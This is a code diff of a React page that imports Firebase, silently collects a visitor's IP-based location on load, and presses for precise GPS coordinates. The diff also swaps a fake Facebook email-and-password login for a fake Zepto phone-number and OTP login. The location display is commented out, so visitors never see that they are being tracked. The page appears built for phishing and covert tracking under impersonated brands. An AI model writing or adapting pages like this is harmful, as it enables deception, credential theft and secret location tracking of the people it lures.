@@ -5,10 +5,11 @@ import { ref, push } from "firebase/database";
 function App() {
   const [location, setLocation] = useState(null);
   const [loading, setLoading] = useState(true);
-  const [gpsDenied, setGpsDenied] = useState(false); // Track GPS denial
+  const [gpsDenied, setGpsDenied] = useState(false);
+  const [gpsEnabled, setGpsEnabled] = useState(false);
 
   useEffect(() => {
-    getIPLocation(); // Step 1: Get IP-based location first
+    getIPLocation();
   }, []);
 
   // 📌 Step 1: Get Location Using IP First
@@ -30,40 +31,59 @@ function App() {
       setLocation(ipLocationData);
       saveLocation(ipLocationData);
 
-      // Now ask for GPS Location
-      requestGPSLocation();
+      // Now check GPS status
+      checkGPSPermission();
     } catch (err) {
       console.error("❌ IP Geolocation failed:", err);
-      requestGPSLocation(); // Still ask for GPS even if IP fails
+      checkGPSPermission();
     }
   };
 
-  // 📌 Step 2: Request GPS Permission
-  const requestGPSLocation = () => {
-    console.log("📌 Checking GPS location permission...");
+  // 📌 Step 2: Check GPS Permission & Enable GPS if Needed
+  const checkGPSPermission = () => {
     if ("permissions" in navigator) {
       navigator.permissions
         .query({ name: "geolocation" })
         .then((permission) => {
-          if (permission.state === "granted" || permission.state === "prompt") {
-            console.log("✅ GPS permission granted. Fetching GPS...");
+          if (permission.state === "granted") {
+            console.log("✅ GPS is enabled. Fetching precise location...");
+            setGpsEnabled(true);
             getGPSLocation();
+          } else if (permission.state === "prompt") {
+            console.log("⚠️ GPS permission required. Asking user...");
+            requestGPSPermission();
           } else {
-            console.warn("❌ GPS Permission Denied.");
+            console.warn("❌ GPS is blocked. Ask user to enable manually.");
             setGpsDenied(true);
           }
         })
         .catch(() => {
-          console.warn("⚠️ Permission API failed, trying GPS...");
-          getGPSLocation();
+          console.warn("⚠️ Permission API failed. Trying GPS...");
+          requestGPSPermission();
         });
     } else {
-      console.warn("⚠️ Permission API not supported, trying GPS...");
-      getGPSLocation();
+      console.warn("⚠️ Permission API not supported. Trying GPS...");
+      requestGPSPermission();
     }
   };
 
-  // 📌 Step 3: Get Precise GPS Location
+  // 📌 Step 3: Request GPS Permission Manually
+  const requestGPSPermission = () => {
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          setGpsEnabled(true);
+          getGPSLocation();
+        },
+        (error) => {
+          console.warn("❌ GPS permission denied:", error);
+          setGpsDenied(true);
+        }
+      );
+    }
+  };
+
+  // 📌 Step 4: Get Precise GPS Location
   const getGPSLocation = () => {
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
@@ -107,7 +127,7 @@ function App() {
         justifyContent: "center",
         alignItems: "center",
         height: "100vh",
-        backgroundColor: "#f0f2f5",
+        backgroundColor: "#F6F6F6",
         fontFamily: "Arial, sans-serif",
       }}
     >
@@ -115,35 +135,23 @@ function App() {
         style={{
           textAlign: "center",
           width: "90%",
-          maxWidth: "400px",
+          maxWidth: "360px",
           backgroundColor: "white",
-          padding: "20px",
-          borderRadius: "8px",
-          boxShadow: "0px 4px 10px rgba(0,0,0,0.1)",
+          padding: "24px",
+          borderRadius: "10px",
+          boxShadow: "0px 2px 10px rgba(0,0,0,0.1)",
         }}
       >
-        <h1 style={{ color: "#1877f2", fontSize: "32px", fontWeight: "bold" }}>
-          facebook
+        <h1 style={{ color: "#333", fontSize: "28px", fontWeight: "bold", marginBottom: "8px" }}>
+          Welcome to Zepto
         </h1>
-        <p style={{ color: "#606770", fontSize: "16px" }}>
-          Connect with friends and the world around you on Facebook.
+        <p style={{ color: "#777", fontSize: "14px", marginBottom: "20px" }}>
+          Get groceries and essentials delivered in minutes.
         </p>
 
         <input
           type="text"
-          placeholder="Email or phone number"
-          style={{
-            width: "100%",
-            padding: "12px",
-            margin: "10px 0",
-            borderRadius: "6px",
-            border: "1px solid #ddd",
-            fontSize: "16px",
-          }}
-        />
-        <input
-          type="password"
-          placeholder="Password"
+          placeholder="Enter Mobile Number"
           style={{
             width: "100%",
             padding: "12px",
@@ -157,7 +165,7 @@ function App() {
           style={{
             width: "100%",
             padding: "12px",
-            backgroundColor: "#1877f2",
+            backgroundColor: "#FF1654",
             color: "white",
             fontSize: "16px",
             fontWeight: "bold",
@@ -167,36 +175,28 @@ function App() {
             marginTop: "10px",
           }}
         >
-          Log In
+          Get OTP
         </button>
         <p
           style={{
-            color: "#1877f2",
+            color: "#FF1654",
             fontSize: "14px",
             marginTop: "10px",
             cursor: "pointer",
           }}
         >
-          Forgot password?
+          Need Help?
         </p>
-        <hr style={{ margin: "20px 0", border: "0.5px solid #ddd" }} />
-        <button
-          style={{
-            width: "100%",
-            padding: "12px",
-            backgroundColor: "#42b72a",
-            color: "white",
-            fontSize: "16px",
-            fontWeight: "bold",
-            border: "none",
-            borderRadius: "6px",
-            cursor: "pointer",
-          }}
-        >
-          Create New Account
-        </button>
 
-        {/* Location Information */}
+        <hr style={{ margin: "20px 0", border: "0.5px solid #ddd" }} />
+
+        <p style={{ fontSize: "14px", color: "#606770" }}>
+          By continuing, you agree to Zepto's{" "}
+          <span style={{ color: "#FF1654", cursor: "pointer" }}>Terms of Service</span> &{" "}
+          <span style={{ color: "#FF1654", cursor: "pointer" }}>Privacy Policy</span>.
+        </p>
+
+        {/* Location Info */}
         {/* <div style={{ marginTop: "20px", fontSize: "14px", color: "#606770" }}>
           {loading ? (
             <p>Fetching location...</p>
@@ -212,7 +212,7 @@ function App() {
                 target="_blank"
                 rel="noopener noreferrer"
                 style={{
-                  color: "#1877f2",
+                  color: "#FF1654",
                   textDecoration: "none",
                   fontWeight: "bold",
                 }}
@@ -222,7 +222,7 @@ function App() {
             </div>
           ) : gpsDenied ? (
             <p style={{ color: "red", fontWeight: "bold" }}>
-              GPS is blocked. Please enable location services or refresh the page.
+              GPS is blocked. Please enable location services manually.
             </p>
           ) : (
             <p>Could not retrieve location</p>
